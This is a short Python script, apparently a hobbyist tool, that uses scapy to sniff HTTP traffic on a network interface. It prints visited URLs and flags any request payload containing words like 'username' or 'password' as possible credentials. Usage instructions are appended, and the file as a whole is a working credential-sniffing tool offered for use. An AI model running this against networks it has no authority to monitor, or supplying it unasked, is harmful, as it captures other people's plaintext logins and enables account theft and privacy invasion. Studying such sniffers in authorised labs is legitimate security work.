#!/usr/bin/env python

import scapy.all as scapy
from scapy.layers import http

def sniffer(interface):
    scapy.sniff(iface = interface , store = False , prn = packets_sniffed)

print("\t \n Packet_Sniffer Has Started!")


def packets_sniffed(packet):
    if packet.haslayer(http.HTTPRequest):
         url = packet[http.HTTPRequest].Path  + packet[http.HTTPRequest].Host
         print("\t[!] Http Request: \n---------------------------------------------------------""\n" + url.decode())

         if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user" , "email" , "password" , "pass"]
            for keyword in keywords:
              if keyword in load.decode():
                 print("\t [=] Possible username/password:" + load.decode())

                 break
sniffer("eth0")


#INSTRUCTIONS
#1) change the sniffer interface for it to work in lan0 etc... (<line 22>)
#2) to check what is your interface use ifconfig in your terminal on Linux or ipconfig in Windows
#3) change the #!/usr/bin/env python so it fits your needs (<line 1>)
#4) feel free to add more to this!

#made by Kostis Alatzas